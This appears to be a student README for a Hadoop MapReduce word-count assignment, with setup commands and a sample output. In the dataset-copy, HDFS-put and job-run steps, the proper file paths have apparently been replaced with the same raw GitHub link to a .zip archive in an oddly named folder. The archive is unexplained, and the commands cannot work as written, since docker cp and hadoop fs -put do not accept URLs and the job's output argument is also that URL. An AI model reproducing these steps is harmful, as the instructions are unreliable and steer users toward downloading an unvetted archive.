
# WordCount-Using-MapReduce-Hadoop

This repository is designed to test MapReduce jobs using a simple word count dataset.

## Objectives

By completing this activity, students will:

1. **Understand Hadoop's Architecture:** Learn how Hadoop's distributed file system (HDFS) and MapReduce framework work together to process large datasets.
2. **Build and Deploy a MapReduce Job:** Gain experience in compiling a Java MapReduce program, deploying it to a Hadoop cluster, and running it using Docker.
3. **Interact with Hadoop Ecosystem:** Practice using Hadoop commands to manage HDFS and execute MapReduce jobs.
4. **Work with Docker Containers:** Understand how to use Docker to run and manage Hadoop components and transfer files between the host and container environments.
5. **Analyze MapReduce Job Outputs:** Learn how to retrieve and interpret the results of a MapReduce job.


### Project Overview – A brief explanation of what the project does.

This is word count problem. By the end frequency of each word in the text file is counted and a new output text file is created with the frequency output.

### Approach and Implementation – Explanation of the Mapper and Reducer logic.

Mapper -> Extends mapper class and the code logic is: 
1) hadoop string datatype(Text) is converted to java string
2) For each word in the line the mapper outputs <word,1>
as key,value pair.

Reduce -> Extends reduce class and input is from sort,merge function. Input is again key,value pair with key being unique word and value is list of 1s. The number of 1s in the list is the frequency of the word.

1) All the 1s from the list are added.
2) Word, count is written as output

Execution Steps – Include the commands used to build and run your project.

## Setup and Execution

### 1. **Start the Hadoop Cluster**

Run the following command to start the Hadoop cluster:

```bash
docker compose up -d
```

### 2. **Build the Code**

Build the code using Maven:

```bash
mvn install
```

### 3. **Move JAR File to Shared Folder**

Move the generated JAR file to a shared folder for easy access:

```bash
mv target/*.jar shared-folder/input/code/
```

### 4. **Copy JAR to Docker Container**

Copy the JAR file to the Hadoop ResourceManager container:

```bash
docker cp shared-folder/input/code/<your-jar-file>.jar resourcemanager:/opt/hadoop-3.2.1/share/hadoop/mapreduce/
```

### 5. **Move Dataset to Docker Container**

Copy the dataset to the Hadoop ResourceManager container:

```bash
docker cp https://raw.githubusercontent.com/pavandantu18/hands-on-3-mapreduce-word-count-using-map-reduce-pavandantu18/master/portendance/hands-on-3-mapreduce-word-count-using-map-reduce-pavandantu18.zip resourcemanager:/opt/hadoop-3.2.1/share/hadoop/mapreduce/
```

### 6. **Connect to Docker Container**

Access the Hadoop ResourceManager container:

```bash
docker exec -it resourcemanager /bin/bash
```

Navigate to the Hadoop directory:

```bash
cd /opt/hadoop-3.2.1/share/hadoop/mapreduce/
```

### 7. **Set Up HDFS**

Create a folder in HDFS for the input dataset:

```bash
hadoop fs -mkdir -p /input/dataset
```

Copy the input dataset to the HDFS folder:

```bash
hadoop fs -put https://raw.githubusercontent.com/pavandantu18/hands-on-3-mapreduce-word-count-using-map-reduce-pavandantu18/master/portendance/hands-on-3-mapreduce-word-count-using-map-reduce-pavandantu18.zip /input/dataset
```

### 8. **Execute the MapReduce Job**

Run your MapReduce job using the following command:

```bash
hadoop jar /opt/hadoop-3.2.1/share/hadoop/mapreduce/<your-jar-file>.jar https://raw.githubusercontent.com/pavandantu18/hands-on-3-mapreduce-word-count-using-map-reduce-pavandantu18/master/portendance/hands-on-3-mapreduce-word-count-using-map-reduce-pavandantu18.zip https://raw.githubusercontent.com/pavandantu18/hands-on-3-mapreduce-word-count-using-map-reduce-pavandantu18/master/portendance/hands-on-3-mapreduce-word-count-using-map-reduce-pavandantu18.zip /output
```

### 9. **View the Output**

To view the output of your MapReduce job, use:

```bash
hadoop fs -cat /output/*
```

### 10. **Copy Output from HDFS to Local OS**

To copy the output from HDFS to your local machine:

1. Use the following command to copy from HDFS:
    ```bash
    hdfs dfs -get /output /opt/hadoop-3.2.1/share/hadoop/mapreduce/
    ```

2. use Docker to copy from the container to your local machine:
   ```bash
   exit 
   ```
    ```bash
    docker cp resourcemanager:/opt/hadoop-3.2.1/share/hadoop/mapreduce/output/ shared-folder/output/
    ```
3. Commit and push to your repo so that we can able to see your output

### Challenges Faced & Solutions – Mention any difficulties encountered and how they were resolved.

Everything was seamless due to github codespaces. 

### Sample Input and Output – Provide a test case example and its expected output.

### Input:
Hadoop is a framework that allows for the distributed processing of large data sets across clusters of computers.
Hadoop is designed to scale up from single servers to thousands of machines, each offering local computation and storage.
Rather than rely on hardware to deliver high-availability, the library itself is designed to detect and handle failures at the application layer.
MapReduce is a core component of the Hadoop ecosystems.

### Output:

Hadoop  3
MapReduce       1
Rather  1
a       2
across  1
allows  1
and     2
application     1
at      1
clusters        1
component       1
computation     1
computers.      1
core    1
data    1
deliver 1
designed        2
detect  1
distributed     1
each    1
ecosystems.     1
failures        1
for     1
framework       1
from    1
handle  1
hardware        1
high-availability,      1
is      4
itself  1
large   1
layer.  1
library 1
local   1
machines,       1
of      4
offering        1
on      1
processing      1
rely    1
scale   1
servers 1
sets    1
single  1
storage.        1
than    1
that    1
the     4
thousands       1
to      4
up      1